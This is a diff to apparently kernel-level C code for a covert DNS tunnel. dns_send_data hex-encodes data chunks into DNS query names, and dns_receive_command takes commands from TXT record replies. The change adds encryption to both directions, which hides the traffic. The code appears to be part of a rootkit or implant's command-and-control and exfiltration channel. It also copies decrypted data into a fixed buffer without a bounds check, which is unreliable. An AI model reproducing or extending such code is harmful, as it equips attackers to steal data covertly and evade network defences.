@@ -152,7 +152,14 @@ static int dns_send_query(const char *query_name, __be16 question_type, u8 *resp
  * @return 0 on success, negative errno on failure.
  */
 int dns_send_data(const char *data, size_t data_len) {
-    size_t total_chunks = (data_len + DNS_MAX_CHUNK - 1) / DNS_MAX_CHUNK;
+    char *encrypted_msg = NULL;
+    size_t encrypted_len = 0;
+
+    // Encrypt the data before sending
+    if (encrypt_buffer(data, data_len, &encrypted_msg, &encrypted_len) < 0)
+        return -EIO;
+
+    size_t total_chunks = (encrypted_len + DNS_MAX_CHUNK - 1) / DNS_MAX_CHUNK;
     size_t chunk_index;
     int response_length_local;
     u8 *response_buffer_local;
@@ -164,7 +171,7 @@ int dns_send_data(const char *data, size_t data_len) {
 
     // Loop over each data chunk
     for (chunk_index = 0; chunk_index < total_chunks; chunk_index++) {
-        size_t chunk_size = min(data_len - chunk_index * DNS_MAX_CHUNK, (size_t)DNS_MAX_CHUNK);
+        size_t chunk_size = min(encrypted_len - chunk_index * DNS_MAX_CHUNK, (size_t)DNS_MAX_CHUNK);
         char hex_buffer[2 * DNS_MAX_CHUNK + 1];
         char seq_label[80];
         char full_qname[128];
@@ -172,7 +179,7 @@ int dns_send_data(const char *data, size_t data_len) {
 
         // Hex-encode the chunk
         for (i = 0; i < chunk_size; i++)
-            sprintf(hex_buffer + 2 * i, "%02x", data[chunk_index * DNS_MAX_CHUNK + i]);
+            sprintf(hex_buffer + 2 * i, "%02x", encrypted_msg[chunk_index * DNS_MAX_CHUNK + i]);
         hex_buffer[2 * chunk_size] = '\0';
 
         // Prefix with sequence/total header (not the best way to do it I think, but works)
@@ -264,12 +271,22 @@ int dns_receive_command(char *out_buffer, size_t max_length) {
         u8 txt_length = response_buffer_local[offset++];
         if (txt_length >= max_length)
             txt_length = max_length - 1;
+        
+        char *decrypted = NULL;
+        size_t decrypted_len = 0;
 
-        memcpy(out_buffer, response_buffer_local + offset, txt_length);
-        out_buffer[txt_length] = '\0';
+        if (decrypt_buffer(response_buffer_local + offset, txt_length, &decrypted, &decrypted_len) < 0) {
+            kfree(response_buffer_local);
+            return -EIO;
+        }
 
+        memcpy(out_buffer, decrypted, decrypted_len);
+        out_buffer[decrypted_len] = '\0';
+
+        // Marie Kondo
         kfree(response_buffer_local);
-        return txt_length;
+        kfree(decrypted);
+        return decrypted_len;
     }
 
     // Marie Kondo
